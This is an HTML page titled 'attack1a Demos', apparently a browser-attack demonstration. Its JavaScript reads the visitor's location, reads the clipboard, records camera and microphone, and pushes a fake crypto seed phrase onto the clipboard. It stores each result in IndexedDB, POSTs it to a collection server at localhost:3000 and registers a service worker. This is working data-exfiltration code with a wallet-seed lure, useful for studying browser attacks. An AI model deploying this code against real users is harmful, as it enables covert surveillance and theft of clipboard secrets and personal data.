<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>attack1a Demos</title>
  <link href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">
  <style>
    .container {
      margin-top: 20px;
    }
  </style>
</head>

<body>
  <div class="container">
    <h1>attack1a - Client</h1>
    <button id="sendLocation" class="btn btn-primary">Send IP and Geolocation</button>
    <button id="sendClipboard" class="btn btn-secondary">Send Clipboard Content</button>
    <button id="startRecording" class="btn btn-success">Start Recording</button>
    <button id="stopRecording" class="btn btn-danger" disabled>Stop Recording</button>
    <button id="copyCryptoSeed" class="btn btn-warning">Copy your crypto seed to Trust Wallet, MetaMask</button>
  </div>

  <script>
    // IndexedDB Setup
    let db;

    // 打开 IndexedDB
    const dbRequest = indexedDB.open("AttackDB", 1);
    dbRequest.onupgradeneeded = function (event) {
      db = event.target.result;
      db.createObjectStore("data", { keyPath: "type" });
    };

    dbRequest.onsuccess = function (event) {
      db = event.target.result;
      console.log("IndexedDB successfully opened.");
    };

    dbRequest.onerror = function (event) {
      console.error("Error opening IndexedDB:", event.target.errorCode);
    };

    // 保存数据到 IndexedDB 并发送到服务器
    function saveToIndexedDBAndSendToServer(type, data) {
      if (!db) {
        console.error("Database not initialized.");
        return;
      }
      const transaction = db.transaction("data", "readwrite");
      const store = transaction.objectStore("data");
      store.put({ type, data });
      transaction.oncomplete = () => {
        console.log(`${type} data saved to IndexedDB`);
        sendToServer(type, data);
      };
      transaction.onerror = (error) => console.error("Error saving data:", error);
    }

    // 发送数据到服务器
    async function sendToServer(type, data) {
      try {
        const response = await fetch("http://localhost:3000", {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({ type, data }),
        });
        const result = await response.json();
        console.log(`Data sent to server (${type}):`, result);
      } catch (error) {
        console.error("Failed to send data to server:", error);
      }
    }

    // Geolocation Button
    document.getElementById('sendLocation').addEventListener('click', function () {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
          function (position) {
            const geolocationData = {
              latitude: position.coords.latitude,
              longitude: position.coords.longitude,
              timestamp: new Date().toISOString()
            };
            saveToIndexedDBAndSendToServer("geolocation", geolocationData);
          },
          function (error) {
            console.error("Geolocation error:", error);
          }
        );
      }
    });

    // Clipboard Button
    document.getElementById('sendClipboard').addEventListener('click', async function () {
      try {
        const clipboardText = await navigator.clipboard.readText();
        saveToIndexedDBAndSendToServer("clipboard", { clipboardContent: clipboardText });
      } catch (error) {
        console.error("Failed to read clipboard:", error);
      }
    });

    // Recording Button
    let mediaRecorder;
    let recordedChunks = [];

    document.getElementById('startRecording').addEventListener('click', async function () {
      const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
      mediaRecorder = new MediaRecorder(stream);
      mediaRecorder.ondataavailable = event => {
        if (event.data.size > 0) recordedChunks.push(event.data);
      };
      mediaRecorder.onstop = () => {
        const blob = new Blob(recordedChunks, { type: 'video/webm' });
        const reader = new FileReader();
        reader.onloadend = () => {
          const base64data = reader.result;
          saveToIndexedDBAndSendToServer("recording", { video: base64data });
        };
        reader.readAsDataURL(blob);
        recordedChunks = [];
      };
      mediaRecorder.start();
      document.getElementById('stopRecording').disabled = false;
      document.getElementById('startRecording').disabled = true;
    });

    document.getElementById('stopRecording').addEventListener('click', function () {
      if (mediaRecorder && mediaRecorder.state !== 'inactive') {
        mediaRecorder.stop();
        document.getElementById('stopRecording').disabled = true;
        document.getElementById('startRecording').disabled = false;
      }
    });

    // Crypto Seed Button
    function generateRandomSeed() {
      const wordList = [
        "abandon", "ability", "able", "about", "above", "absent", "absorb", "abstract", "absurd", "abuse",
        "access", "accident", "account", "accuse", "achieve", "acid", "acoustic", "acquire", "across", "act",
        // Add more words to meet the BIP39 standard if necessary
      ];
      let seed = [];
      for (let i = 0; i < 12; i++) { // Generate a 12-word seed
        const randomIndex = Math.floor(Math.random() * wordList.length);
        seed.push(wordList[randomIndex]);
      }
      return seed.join(" ");
    }

    document.getElementById('copyCryptoSeed').addEventListener('click', async function () {
      const cryptoSeed = generateRandomSeed();
      try {
        await navigator.clipboard.writeText(cryptoSeed);
        saveToIndexedDBAndSendToServer("cryptoSeed", { seed: cryptoSeed });
      } catch (error) {
        console.error("Failed to copy crypto seed to clipboard:", error);
      }
    });

    // Register Service Worker
    if ('serviceWorker' in navigator) {
      window.addEventListener('load', () => {
        navigator.serviceWorker.register('/attack1a/sw.js')
          .then(reg => console.log('Service Worker registered with scope:', reg.scope))
          .catch(err => console.error('Service Worker registration failed:', err));
      });
    }
  </script>
</body>

</html>
